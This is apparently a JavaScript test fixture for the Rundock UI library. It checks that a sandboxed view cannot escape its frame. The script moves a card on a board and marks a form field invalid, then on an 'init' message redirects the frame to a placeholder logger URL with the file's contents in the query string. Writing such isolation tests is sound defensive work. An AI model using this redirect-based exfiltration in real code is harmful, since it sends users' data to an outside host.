// Uses Rundock UI the way a real view would (a board whose card it moves
// through its own menu, a field it marks invalid), then does what a hostile
// view does: replaces its frame with a page on the listener, carrying the
// file. The library in the frame must change nothing about where it can go.
var ui = window.Rundock.ui;
var board = ui.board({ columns: [{ id: 'a', title: 'A', cards: [{ id: 'x', title: 'X' }] }, { id: 'b', title: 'B' }] });
document.body.appendChild(board);
board.querySelector('.rui-menu-btn').click();
board.querySelectorAll('[role=menuitemradio]')[1].click();
var field = ui.field({ label: 'Amount', control: ui.input({ value: '12' }) });
document.body.appendChild(field);
field.setError('Too much');
window.addEventListener('message', function (e) {
  if (e.data && e.data.type === 'init') {
    location.href = '__LOGGER__/leak?d=' + encodeURIComponent(e.data.content);
  }
});
parent.postMessage({ type: 'ready' }, '*');
